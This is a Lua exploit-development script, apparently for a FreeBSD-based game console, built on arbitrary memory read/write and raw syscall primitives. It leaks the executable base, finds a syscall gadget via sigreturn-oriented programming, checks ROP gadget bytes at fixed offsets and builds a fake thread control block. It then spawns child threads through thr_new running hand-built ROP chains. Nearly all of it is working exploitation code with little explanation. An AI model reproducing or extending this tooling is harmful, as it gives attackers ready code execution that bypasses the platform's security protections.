-- CRASH_CLASS: LOW
-- PROBE 1403d: child thread ROP diagnostic
--
-- Isolates where the child crashes by running 3 phases:
--   A: bare marker write + thr_exit (no sysarch, no rdtsc)
--   B: sysarch + marker + thr_exit
--   C: sysarch + rdtsc + marker + thr_exit
-- Also verifies every gadget's bytes before use.

print("=== 1403d: child diag ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function wq2(addr, hi, lo)
    wd(addr, lo)
    wd(addr + 4, hi)
end
local function add_off(hi, lo, off)
    lo = lo + off
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return hi, lo
end

-- Get eboot
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- ============================================================
-- [A] Syscall gadget via SROP
-- ============================================================
print("")
print("=== [A] syscall addr ===")
local ctx = memory.alloc(0x500)
local sc_gc = mk(421)
pcall(function() return sc_gc(uint64(N(ctx))) end)
local brip = rq(N(ctx) + 0x40 + 0xA0)
if not brip then print("FAIL: no RIP") return end
local sc_hi, sc_lo = get_hi_lo(brip)
sc_lo = sc_lo - 2
if sc_lo < 0 then sc_hi = sc_hi - 1; sc_lo = sc_lo + 0x100000000 end
print(string.format("sc=0x%X%08X", sc_hi, sc_lo))

-- Quick SROP getpid to validate
local sc_sr = mk(417)
pcall(function() return sc_gc(uint64(N(ctx))) end)
wd(N(ctx) + 0x40 + 0xA0, sc_lo); wd(N(ctx) + 0x40 + 0xA0 + 4, sc_hi)
wd(N(ctx) + 0x40 + 0x38, 20); wd(N(ctx) + 0x40 + 0x38 + 4, 0)
local ok, rv = pcall(function() return sc_sr(uint64(N(ctx))) end)
if ok and rv then print("pid=" .. N(rv)) else print("SROP FAIL") return end

-- ============================================================
-- [B] Gadget byte verification
-- ============================================================
print("")
print("=== [B] gadget bytes ===")

local offsets = {
    {"pop_rax",  0x992,   {0x58, 0xC3}},              -- 58=pop rax, C3=ret
    {"pop_rdi",  0xC9DFE, {0x5F, 0xC3}},              -- 5F=pop rdi, C3=ret
    {"pop_rsi",  0xD77D,  {0x5E, 0xC3}},              -- 5E=pop rsi, C3=ret
    {"pop_rcx",  0xE64,   {0x59, 0xC3}},              -- 59=pop rcx, C3=ret
    {"mov_w",    0x92C67, {0x48, 0x89, 0x07, 0xC3}},  -- mov [rdi],rax;ret
    {"rdtsc",    0x6A109, {0x0F, 0x31}},               -- rdtsc
    {"ret",      0x42,    {0xC3}},                     -- bare ret
}

local g = {}
local all_ok = true
for _, entry in ipairs(offsets) do
    local name, off, expected = entry[1], entry[2], entry[3]
    local hi, lo = add_off(eb_hi, eb_lo, off)
    g[name] = {hi, lo}
    local addr_n = N(uint64(string.format("0x%X%08X", hi, lo)))
    local d = rd(addr_n)
    if d then
        local actual = {}
        actual[1] = d % 256
        actual[2] = math.floor(d / 256) % 256
        actual[3] = math.floor(d / 65536) % 256
        actual[4] = math.floor(d / 16777216) % 256
        local match = true
        local hex_act = ""
        local hex_exp = ""
        for i = 1, #expected do
            hex_act = hex_act .. string.format("%02X ", actual[i])
            hex_exp = hex_exp .. string.format("%02X ", expected[i])
            if actual[i] ~= expected[i] then match = false end
        end
        local tag = match and "OK" or "MISMATCH"
        print(string.format("  %s +0x%X: %s[%s] exp %s", name, off, hex_act, tag, hex_exp))
        if not match then all_ok = false end
    else
        print(string.format("  %s +0x%X: UNREADABLE", name, off))
        all_ok = false
    end
end

if not all_ok then
    print("GADGET VERIFICATION FAILED — aborting")
    return
end

-- ============================================================
-- [C] Shared resources
-- ============================================================
print("")
print("=== [C] resources ===")

local STACK_ALLOC = 0x8000
local STACK_REPORT = 0x7800

-- Fake TCB
local tcb = memory.alloc(0x1000)
local tcb_n = N(tcb)
local tcb_hi, tcb_lo = get_hi_lo(tcb)
for i = 0, 0x1000 - 4, 4 do
    wd(tcb_n + i, (i % 8 == 0) and tcb_lo or tcb_hi)
end

-- tcb_ptr (pointer-to-tcb for sysarch)
local tcb_ptr = memory.alloc(8)
wq2(N(tcb_ptr), tcb_hi, tcb_lo)
local tp_hi, tp_lo = get_hi_lo(tcb_ptr)

-- Null buffer (for rdtsc gadget)
local null_buf = memory.alloc(16)
wd(N(null_buf), 0); wd(N(null_buf) + 4, 0)
wd(N(null_buf) + 8, 0); wd(N(null_buf) + 12, 0)
local nb_hi, nb_lo = get_hi_lo(null_buf)

print("shared alloc done")
collectgarbage("collect")

-- ============================================================
-- Helper: launch a child with a given ROP chain
-- ============================================================
local function run_child(label, chain, result_buf, result_n)
    -- Allocate stack
    local stk = memory.alloc(STACK_ALLOC)
    local stk_n = N(stk)
    for i = 0, STACK_ALLOC - 4, 4 do wd(stk_n + i, 0) end

    -- RSP
    local rsp = stk_n + STACK_REPORT
    rsp = (math.floor(rsp / 16) * 16) - 8

    -- Write chain
    for i, entry in ipairs(chain) do
        local off = (i - 1) * 8
        wd(rsp + off, entry[2])      -- lo
        wd(rsp + off + 4, entry[1])  -- hi
    end

    -- thr_param
    local param = memory.alloc(0x40)
    local param_n = N(param)
    -- start_func = pop_rax; ret
    wq2(param_n + 0x00, g.pop_rax[1], g.pop_rax[2])
    -- arg = result buf (goes into RDI, but pop_rdi in chain overrides)
    wq2(param_n + 0x08, get_hi_lo(result_buf))
    -- stack_base
    wq2(param_n + 0x10, get_hi_lo(stk))
    -- stack_size
    wq2(param_n + 0x18, 0, STACK_REPORT)
    -- tls_base=0, tls_size=0
    wq2(param_n + 0x20, 0, 0)
    wq2(param_n + 0x28, 0, 0)
    -- child_tid
    local ctid = memory.alloc(8)
    wd(N(ctid), 0); wd(N(ctid) + 4, 0)
    wq2(param_n + 0x30, get_hi_lo(ctid))

    collectgarbage("collect")

    -- Launch
    local sc_thr = mk(455)
    local ok_t, rv_t = pcall(function()
        return sc_thr(uint64(N(param)), uint64(0x38))
    end)

    if not ok_t then
        print(label .. ": thr_new FAIL")
        return false
    end
    print(label .. ": thr_new=" .. N(rv_t))

    -- Poll for marker at result[0]
    local found = false
    for i = 1, 100000 do
        local m = rd(result_n)
        if m ~= 0xDEADDEAD then
            found = true
            print(label .. ": marker at poll " .. i .. " val=0x" .. string.format("%08X", m))
            break
        end
    end
    if not found then
        local m = rd(result_n)
        print(label .. ": TIMEOUT marker=0x" .. string.format("%08X", m or 0))
    end

    -- Small delay for child to finish
    for i = 1, 10000 do end

    return found
end

-- ============================================================
-- [D] PHASE A — bare marker + thr_exit (no sysarch)
-- ============================================================
print("")
print("=== [D] phase A: bare marker ===")

local resA = memory.alloc(0x40)
local resA_n = N(resA)
for i = 0, 0x3C, 4 do wd(resA_n + i, 0xDEADDEAD) end
local resA_hi, resA_lo = get_hi_lo(resA)

local chainA = {
    -- pop_rax → 0xCAFEBABE
    {0, 0xCAFEBABE},
    -- pop_rdi → &result[0]
    {g.pop_rdi[1], g.pop_rdi[2]},
    {resA_hi, resA_lo},
    -- mov [rdi],rax; ret → store marker
    {g.mov_w[1], g.mov_w[2]},
    -- pop_rax → 431 (thr_exit)
    {g.pop_rax[1], g.pop_rax[2]},
    {0, 431},
    -- pop_rdi → 0
    {g.pop_rdi[1], g.pop_rdi[2]},
    {0, 0},
    -- syscall;ret → thr_exit(0)
    {sc_hi, sc_lo},
}

local phaseA = run_child("A", chainA, resA, resA_n)

-- ============================================================
-- [E] PHASE B — sysarch + marker + thr_exit
-- ============================================================
print("")
print("=== [E] phase B: sysarch + marker ===")

local resB = memory.alloc(0x40)
local resB_n = N(resB)
for i = 0, 0x3C, 4 do wd(resB_n + i, 0xDEADDEAD) end
local resB_hi, resB_lo = get_hi_lo(resB)

local chainB = {
    -- sysarch(165, op=129, parms=&tcb_ptr)
    {0, 165},                           -- pop_rax → 165
    {g.pop_rdi[1], g.pop_rdi[2]},       -- pop_rdi
    {0, 129},                            -- rdi = 129
    {g.pop_rsi[1], g.pop_rsi[2]},       -- pop_rsi
    {tp_hi, tp_lo},                      -- rsi = &tcb_ptr
    {sc_hi, sc_lo},                      -- syscall;ret

    -- marker: pop_rax → 0xCAFEBEEF
    {g.pop_rax[1], g.pop_rax[2]},
    {0, 0xCAFEBEEF},
    -- pop_rdi → &result
    {g.pop_rdi[1], g.pop_rdi[2]},
    {resB_hi, resB_lo},
    -- mov [rdi],rax; ret
    {g.mov_w[1], g.mov_w[2]},

    -- thr_exit(431, 0)
    {g.pop_rax[1], g.pop_rax[2]},
    {0, 431},
    {g.pop_rdi[1], g.pop_rdi[2]},
    {0, 0},
    {sc_hi, sc_lo},
}

local phaseB = run_child("B", chainB, resB, resB_n)

-- ============================================================
-- [F] PHASE C — sysarch + rdtsc + marker + thr_exit
-- ============================================================
print("")
print("=== [F] phase C: sysarch + rdtsc ===")

local resC = memory.alloc(0x80)
local resC_n = N(resC)
for i = 0, 0x7C, 4 do wd(resC_n + i, 0xDEADDEAD) end
local resC_hi, resC_lo = get_hi_lo(resC)
local rC8_hi, rC8_lo = add_off(resC_hi, resC_lo, 8)

local chainC = {
    -- sysarch
    {0, 165},
    {g.pop_rdi[1], g.pop_rdi[2]},
    {0, 129},
    {g.pop_rsi[1], g.pop_rsi[2]},
    {tp_hi, tp_lo},
    {sc_hi, sc_lo},

    -- set RCX for rdtsc gadget
    {g.pop_rcx[1], g.pop_rcx[2]},
    {nb_hi, nb_lo},

    -- rdtsc
    {g.rdtsc[1], g.rdtsc[2]},

    -- store TSC → result[0]
    {g.pop_rdi[1], g.pop_rdi[2]},
    {resC_hi, resC_lo},
    {g.mov_w[1], g.mov_w[2]},

    -- completion marker → result[8]
    {g.pop_rax[1], g.pop_rax[2]},
    {0, 0xCAFED00D},
    {g.pop_rdi[1], g.pop_rdi[2]},
    {rC8_hi, rC8_lo},
    {g.mov_w[1], g.mov_w[2]},

    -- thr_exit
    {g.pop_rax[1], g.pop_rax[2]},
    {0, 431},
    {g.pop_rdi[1], g.pop_rdi[2]},
    {0, 0},
    {sc_hi, sc_lo},
}

-- For phase C, poll result[8] for marker
local function run_phaseC()
    local stk = memory.alloc(STACK_ALLOC)
    local stk_n = N(stk)
    for i = 0, STACK_ALLOC - 4, 4 do wd(stk_n + i, 0) end

    local rsp = stk_n + STACK_REPORT
    rsp = (math.floor(rsp / 16) * 16) - 8

    for i, entry in ipairs(chainC) do
        local off = (i - 1) * 8
        wd(rsp + off, entry[2])
        wd(rsp + off + 4, entry[1])
    end

    local param = memory.alloc(0x40)
    local param_n = N(param)
    wq2(param_n + 0x00, g.pop_rax[1], g.pop_rax[2])
    wq2(param_n + 0x08, get_hi_lo(resC))
    wq2(param_n + 0x10, get_hi_lo(stk))
    wq2(param_n + 0x18, 0, STACK_REPORT)
    wq2(param_n + 0x20, 0, 0)
    wq2(param_n + 0x28, 0, 0)
    local ctid = memory.alloc(8)
    wd(N(ctid), 0); wd(N(ctid) + 4, 0)
    wq2(param_n + 0x30, get_hi_lo(ctid))

    collectgarbage("collect")

    local sc_thr = mk(455)
    local ok_t, rv_t = pcall(function()
        return sc_thr(uint64(N(param)), uint64(0x38))
    end)

    if not ok_t then
        print("C: thr_new FAIL")
        return
    end
    print("C: thr_new=" .. N(rv_t))

    -- Poll result[8] for marker
    local found = false
    for i = 1, 100000 do
        local m = rd(resC_n + 8)
        if m ~= 0xDEADDEAD then
            found = true
            print("C: marker at poll " .. i)
            break
        end
    end

    if not found then
        local m8 = rd(resC_n + 8)
        print("C: TIMEOUT marker=0x" .. string.format("%08X", m8 or 0))
    end

    -- Read TSC from result[0]
    local tlo = rd(resC_n)
    local thi = rd(resC_n + 4)
    print(string.format("C: TSC=0x%08X%08X lo_byte=%d", thi or 0, tlo or 0, (tlo or 0) % 256))

    -- Read marker
    local mlo = rd(resC_n + 8)
    local mhi = rd(resC_n + 12)
    print(string.format("C: mark=0x%08X%08X", mhi or 0, mlo or 0))
end

run_phaseC()

-- ============================================================
-- [G] Summary
-- ============================================================
print("")
print("=== [G] summary ===")

-- Dump all result buffers
print("resA:")
for off = 0, 12, 4 do
    local v = rd(resA_n + off)
    print(string.format("  +%02X: 0x%08X", off, v or 0))
end
print("resB:")
for off = 0, 12, 4 do
    local v = rd(resB_n + off)
    print(string.format("  +%02X: 0x%08X", off, v or 0))
end
print("resC:")
for off = 0, 20, 4 do
    local v = rd(resC_n + off)
    print(string.format("  +%02X: 0x%08X", off, v or 0))
end

print("")
print("=== 1403d DONE ===")
